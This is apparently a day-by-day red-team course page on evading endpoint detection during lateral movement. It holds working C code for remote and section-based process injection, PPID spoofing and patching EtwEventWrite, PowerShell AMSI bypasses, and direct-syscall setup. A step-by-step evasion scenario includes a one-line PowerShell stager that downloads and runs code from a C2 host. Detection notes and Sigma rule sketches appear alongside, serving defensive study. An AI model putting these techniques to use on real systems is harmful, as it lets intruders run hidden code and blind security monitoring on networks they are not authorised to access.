---
title: "Advanced EDR Evasion During Lateral Movement"
tags: [red-team, EDR, evasion, lateral-movement, process-injection, fork-n-run,
  syscalls, AMSI, ETW, parent-spoofing, T1055, T1134.004, T1562.001, ATT&CK]
module: 08-RedTeam-03
day: 541
related_topics:
  - Offshore Practice Day 2 Checkpoint (Day 540)
  - AV and EDR Evasion Concepts (Day 494)
  - Advanced Evasion AV Bypass (Day 519)
  - Custom Payload Development (Day 542)
  - Lateral Movement Advanced (Day 498)
---

# Day 541 — Advanced EDR Evasion During Lateral Movement

> "Moving laterally without EDR visibility is not about being clever with
> obfuscation. It is about understanding what the EDR actually monitors and
> making choices that do not cross those lines. An EDR that watches process
> creation will not catch you if you inject into an existing process. An EDR
> that watches network connections will not catch you if your lateral movement
> does not create a new socket from a suspicious process. Know the sensor,
> shape your behaviour around its blindspots."
>
> — Ghost

---

## Goals

Understand what EDR sensors actually instrument and why that creates
exploitable blindspots.
Implement process injection as an alternative to spawning child processes
during lateral movement.
Apply parent process ID (PPID) spoofing to misattribute process creation.
Disable or tamper with AMSI and ETW to protect in-memory payloads.
Detect each of these techniques from the blue team perspective.

**Prerequisites:** Day 519 (advanced evasion basics), Day 498 (lateral movement),
C/C++ or Go basics sufficient to understand code examples.
**Time budget:** 5 hours.

---

## Part 1 — What EDR Actually Monitors

```
EDR sensors instrument the kernel and user-mode via:

  1. Kernel callbacks (highest privilege, hardest to bypass):
     PsSetCreateProcessNotifyRoutine  → fires on every process creation
     PsSetCreateThreadNotifyRoutine   → fires on every thread creation
     PsSetLoadImageNotifyRoutine      → fires on every DLL/image load
     CmRegisterCallback               → registry reads and writes
     ObRegisterCallbacks              → handle creation (including LSASS access)

  2. NTDLL hooking (user-mode, bypassable):
     EDR patches NTDLL in the process's memory to redirect calls
     through the EDR's DLL before reaching the kernel (syscall interception)
     Bypass: direct syscalls skip NTDLL entirely → EDR hooks never fire

  3. ETW (Event Tracing for Windows):
     ETW providers capture data from system components (NTDLL, CLR, etc.)
     Microsoft-Windows-DotNETRuntime → logs all .NET activity (PowerShell)
     Microsoft-Antimalware-Scan-Interface → AMSI scan results
     Bypass: patch EtwEventWrite in memory to suppress telemetry

  4. Minifilter drivers (file and network):
     Intercept all file I/O and network connections
     Cannot be bypassed from user space — operate at kernel level

Attacker decision framework:
  "Does this action create a new process?"
    Yes → EDR will see PsSetCreateProcessNotifyRoutine → HIGH RISK
    No  → Less visible; depends on what else the action does

  "Does this action open a handle to a sensitive process (LSASS)?"
    Yes → ObRegisterCallbacks fires → EDR alerts on suspicious handle access
    No  → Safe

  "Does this action load a new DLL into an existing process?"
    Yes → PsSetLoadImageNotifyRoutine fires → detected if DLL is unsigned
    No  → Safer; in-memory shellcode injection avoids this
```

---

## Part 2 — Process Injection for Lateral Movement (T1055)

### Why Injection Instead of Child Processes

```
Default lateral movement (noisy):
  impacket-wmiexec → creates cmd.exe → cmd.exe runs payload.exe
  Chain:   svchost.exe (WMI) → cmd.exe → payload.exe
  EDR sees: THREE new process creation events
  Process tree looks: suspicious (cmd.exe as child of WMI)

Injection-based lateral movement (quieter):
  Inject shellcode into an already-running, trusted process
  No new process created → no PsSetCreateProcessNotifyRoutine event
  Beacon runs inside the trusted process's memory space
  Process tree: unchanged, beacon looks like the host process

Target processes for injection (pre-existing, trusted):
  explorer.exe      → runs as the logged-in user, always present
  svchost.exe       → runs as SYSTEM, many instances
  notepad.exe       → if user has notepad open
  OneDrive.exe      → legitimate, whitelisted, always runs
  teams.exe         → high-trust, common in corporate environments
```

### Classic Remote Process Injection (VirtualAllocEx + WriteProcessMemory)

```c
// remote_inject.c — inject shellcode into a remote process by PID
// CAUTION: kernel callbacks still fire on the WriteProcessMemory call;
// this is detectable. Use as a teaching example, not a production technique.

#include <windows.h>

int inject(DWORD target_pid, unsigned char *shellcode, SIZE_T sc_len) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return -1;

    LPVOID remote_buf = VirtualAllocEx(
        hProcess, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) { CloseHandle(hProcess); return -2; }

    SIZE_T written;
    WriteProcessMemory(hProcess, remote_buf, shellcode, sc_len, &written);

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

```
Detection:
  Sysmon Event ID 8: CreateRemoteThread
    → Source process creating thread in a DIFFERENT target process
    → Any cross-process CreateRemoteThread is highly suspicious
  
  Sysmon Event ID 10: ProcessAccess
    → Monitors handle opens (OpenProcess with PROCESS_ALL_ACCESS)
    → Alert when: non-admin process opens PROCESS_ALL_ACCESS to trusted processes

Bypass: use a lower-privilege API combination that does not trigger
  PsSetCreateThreadNotifyRoutine directly — but this is a cat-and-mouse game.
  The better bypass is NtMapViewOfSection (see Part 3).
```

### Stealthier: Section-Based Injection (NtMapViewOfSection)

```c
// section_inject.c — map a shared memory section into a remote process
// No WriteProcessMemory, no CreateRemoteThread — different kernel callbacks
// More OPSEC-friendly; still detectable but requires different signatures

// Concept:
// 1. Create a named section with NtCreateSection
// 2. Map it into local process (NtMapViewOfSection)
// 3. Copy shellcode into the mapped section
// 4. Map the same section into the target process
// 5. Create a thread in the target process pointing to the mapped address

// This avoids WriteProcessMemory (which EDRs specifically watch)
// CreateRemoteThread still fires — use QueueUserAPC or NtQueueApcThread
// for fully threadless injection
```

---

## Part 3 — Direct Syscalls to Bypass NTDLL Hooks

```
How EDR NTDLL hooking works:
  EDR patches the first bytes of NTDLL functions (e.g., NtOpenProcess)
  with a JMP into the EDR's DLL
  When your code calls NtOpenProcess → EDR sees the call → logs it

Direct syscall bypass:
  Skip NTDLL entirely
  Call the Windows kernel directly via the syscall instruction
  EDR hook is in NTDLL user-space — bypassing NTDLL means the hook never runs

  Limitation: kernel callbacks (PsSetCreateProcessNotifyRoutine) still fire
  Direct syscalls bypass USER-MODE hooks only, not kernel-mode EDR sensors

Syscall number:
  Each Windows version has a specific syscall number (SSN) for each function
  SSN for NtOpenProcess: 0x26 on Windows 10 21H2 (varies per version)
  Tools like SysWhispers2/SysWhispers3 generate syscall stubs at compile time

SysWhispers3 example (x64 MASM stub):
  NtAllocateVirtualMemory PROC
      mov r10, rcx            ; syscall calling convention
      mov eax, SSN_NtAllocateVirtualMemory  ; SSN resolved at compile time
      syscall
      ret
  NtAllocateVirtualMemory ENDP
```

```bash
# SysWhispers3 setup
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python syswhispers.py --preset common -o syscalls

# Generates: syscalls.h, syscalls.c, syscallsstubs.asm
# Include in your C project to replace NTDLL calls with direct syscalls

# Hells Gate / Halos Gate — dynamic SSN resolution (more robust):
# At runtime, reads NTDLL on disk (unhookedversion) to get the original
# syscall numbers before the EDR can hook them
```

---

## Part 4 — PPID Spoofing (T1134.004)

```
Problem: process trees reveal lateral movement
  wmiexec → cmd.exe → powershell.exe → implant.exe
  Every EDR flags: powershell.exe spawned by cmd.exe spawned by WMI

Solution: PPID spoofing
  Windows allows setting the parent PID at process creation via
  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in STARTUPINFOEX
  Result: the process tree in Task Manager and Sysmon shows a FAKE parent

Example: make implant.exe appear as a child of explorer.exe
  Even though we launched it from our C2 shell
```

```c
// ppid_spoof.c — create a process with a spoofed parent
#include <windows.h>

BOOL spoof_parent(DWORD fake_parent_pid, LPCWSTR app_path) {
    HANDLE hParent = OpenProcess(
        PROCESS_CREATE_PROCESS, FALSE, fake_parent_pid);

    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(), 0, attr_size);
    InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size);

    UpdateProcThreadAttribute(
        attr_list, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXW siex = {0};
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    siex.lpAttributeList = attr_list;

    PROCESS_INFORMATION pi = {0};
    CreateProcessW(
        app_path, NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL,
        (LPSTARTUPINFOW)&siex, &pi);

    // Resume or inject before resuming
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(attr_list);
    HeapFree(GetProcessHeap(), 0, attr_list);
    CloseHandle(hParent);
    return TRUE;
}
```

```
Detection:
  Sysmon Event ID 1: Process creation with ParentProcessId field
  Alert: ParentProcessId does not match the actual creating process's PID
  
  Specific check: PPID spoofing leaves a trace — the CreateProcessW call
  comes from the REAL parent (visible in kernel callbacks), but the
  STARTUPINFOEX spoof shows a different parent in userspace-visible fields.
  
  Sigma rule concept:
  detection:
    selection:
      EventID: 1
      ParentImage: 'C:\Windows\explorer.exe'
      Image|endswith:
        - '\cmd.exe'
        - '\powershell.exe'
        - '\wscript.exe'
    filter:
      # explorer.exe DOES spawn these legitimately sometimes
      ParentCommandLine|contains: 'shell:AppsFolder'
    condition: selection and not filter
  → TUNE: legitimate explorer → cmd spawns will false-positive without tuning
```

---

## Part 5 — AMSI and ETW Patching

### AMSI Bypass (Disable Script Scanning)

```powershell
# AMSI (Antimalware Scan Interface) scans all PowerShell, JScript, VBScript
# It calls AmsiScanBuffer before executing any script content
# Patch the function to always return AMSI_RESULT_CLEAN (1)

# Classic patch (widely blocked by EDRs now — for concept understanding):
$amsiutils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field     = $amsiutils.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null, $true)
# This sets the internal "AMSI initialisation failed" flag → AMSI skipped

# Better: patch AmsiScanBuffer directly via reflection + pinvoke
# Returns 0x80070057 (invalid parameter) on every scan → clean result
[Byte[]] $patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3  # mov eax, 0x80070057; ret
$ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress amsi.dll AmsiScanBuffer),
    [System.Action]).Method.MethodHandle.GetFunctionPointer()
# Patch the first 6 bytes of AmsiScanBuffer

# Detection: Sysmon Event 10 — handle open to amsi.dll with WRITE access
# Or: Event ID 4104 (PowerShell ScriptBlock logging) — look for above strings
```

### ETW Patching (Suppress Telemetry)

```c
// Patch EtwEventWrite in ntdll.dll to suppress ETW events
// This blinds Microsoft-Windows-DotNETRuntime (PowerShell logging)
// and other ETW providers that the EDR relies on

// Concept:
// EtwEventWrite is called by ETW providers before logging
// Patching it with an early return suppresses all ETW events from the process

BOOL patch_etw() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    FARPROC etw_fn = GetProcAddress(ntdll, "EtwEventWrite");

    // Patch: mov eax, 0; ret
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax,eax; ret
    DWORD old_prot;
    VirtualProtect(etw_fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_prot);
    memcpy(etw_fn, patch, sizeof(patch));
    VirtualProtect(etw_fn, sizeof(patch), old_prot, &old_prot);
    return TRUE;
}

// Detection:
// PatchGuard (kernel integrity) detects kernel patches
// User-mode ETW patch: detectable by comparing EtwEventWrite bytes to
// a known-good copy from disk — EDRs that do this catch the patch
// Sysmon does NOT log ETW patches (it uses ETW itself — chicken-and-egg)
// Defender: Module Tampering Protection blocks some ETW patches in protected processes
```

---

## Part 6 — Putting It Together: EDR-Aware Lateral Movement

```
Scenario: Move from HOST-A (current C2 session) to HOST-B without triggering
an alert on a host running CrowdStrike Falcon or Microsoft Defender for Endpoint.

Step 1: Determine the execution method
  Does HOST-B have an SMB share you can write to?
    No → Use impacket-wmiexec or evil-winrm (spawns processes — noisy)
    Yes → Consider section injection after initial access

Step 2: Get initial execution (unavoidably noisy, minimise signal)
  Use WMI via Sliver's wmi-exec feature or impacket-wmiexec
  Minimise the command: do NOT run "cmd.exe /c powershell.exe -EncodedCommand..."
  That chain is flagged by every EDR
  Instead: run a one-line PowerShell stager that downloads + executes in-memory
  Command line: powershell -c "$c=(New-Object Net.WebClient).DownloadString
               ('http://C2/stager'); [ScriptBlock]::Create($c).Invoke()"
  AMSI is still active — your stager must AMSI bypass before executing payload

Step 3: Survive in-memory on HOST-B
  Once the stager runs:
    Patch AMSI (method above)
    Patch ETW (method above)
    Download and execute shellcode via direct syscalls
    Inject into explorer.exe or svchost.exe (choose based on target user context)
    Delete the initial stager file from disk (if any)

Step 4: Blend process tree
  Use PPID spoofing: make your injected beacon appear as a child of explorer.exe
  Set sleep jitter on the C2 beacon: randomise callback intervals ± 30%

Step 5: Validate stealth
  Run Sysmon from HOST-B and check Event ID 1, 7, 8, 10
  Confirm your beacon does not appear in process creation events
  Confirm DLL load events (ID 7) show only signed Microsoft DLLs
```

---

## Exercises

1. On a lab Windows VM with Sysmon running, execute a standard WMI-based
   lateral movement (impacket-wmiexec running cmd.exe). Capture the Sysmon
   events generated. List every Event ID that fired and the exact field values
   a defender would alert on.
2. Implement PPID spoofing in a minimal C program (100 lines or less). Compile
   with mingw-w64. Verify in Task Manager that the spawned process shows
   explorer.exe as parent. Verify what Sysmon Event ID 1 reports for the parent.
3. Patch AMSI in a PowerShell session using the `amsiInitFailed` reflection
   technique. Verify it works by running a string that AMSI blocks normally
   (e.g., `EICAR` string equivalent for AMSI). Then check Event ID 4104 —
   does the patch itself appear in ScriptBlock logging?
4. Write a Sigma rule that detects PPID spoofing when the reported parent is
   explorer.exe but the process image is cmd.exe, powershell.exe, or mshta.exe
   — with appropriate filters to reduce false positives.
5. Explain the difference between patching NTDLL in your own process (direct
   syscall bypass) and patching NTDLL in a remote process. Which one do kernel
   callbacks (PsSetCreateProcessNotifyRoutine) still catch?

---

## Key Takeaways

1. EDRs monitor at two layers: kernel callbacks (cannot bypass from user-space)
   and NTDLL hooks (can bypass with direct syscalls). Direct syscalls bypass
   user-mode hooks but not kernel-mode sensors — this distinction determines
   which techniques actually evade detection and which only appear to.
2. The most detectable action in lateral movement is new process creation.
   Every EDR with PsSetCreateProcessNotifyRoutine alerts on suspicious process
   trees. Injection-based lateral movement avoids creating new processes.
3. PPID spoofing breaks visual attribution in process trees but does not
   bypass kernel callbacks — the kernel always knows the real creator.
   Sophisticated EDRs correlate the kernel-visible parent with the reported
   parent and alert on mismatches.
4. AMSI and ETW patches are detectable by EDRs that scan process memory for
   tampered functions. The value of these patches is reducing telemetry from
   lower-sophistication sensors, not defeating enterprise EDR.
5. "EDR evasion" is not a single technique — it is a continuous decision
   tree: what does this EDR instrument, at what layer, with what fidelity?
   Every evasion decision must be informed by knowledge of the specific
   sensor deployed on the target, not a generic "AV bypass" recipe.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q541.1, Q541.2 …).

---

## Navigation

← Previous: [Day 540 — Offshore Practice Day 2: Checkpoint](DAY-0540-Offshore-Practice-Day-2-Checkpoint.md)
→ Next: [Day 542 — Custom Payload Development and Process Injection](DAY-0542-Custom-Payload-Development-Process-Injection.md)
